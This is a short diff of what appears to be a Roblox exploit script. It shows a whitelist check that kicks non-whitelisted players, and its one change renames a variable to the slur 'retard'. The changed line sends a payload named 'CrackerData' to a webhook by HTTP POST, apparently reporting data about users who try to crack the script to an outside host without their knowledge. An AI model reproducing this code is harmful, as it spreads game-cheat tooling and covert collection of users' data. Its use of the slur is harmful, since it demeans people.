@@ -265,7 +265,7 @@ else
    LocalPlayer:Kick("Execution Failed | WL_ID: (21z7y16): You are not whitelisted!")
 end
 
-r = syn.request({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers}) or http_request({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers})
+retard = syn.request({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers}) or http_request({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers})
 
 pcall(function()
 getgenv().rconsoleprint = g
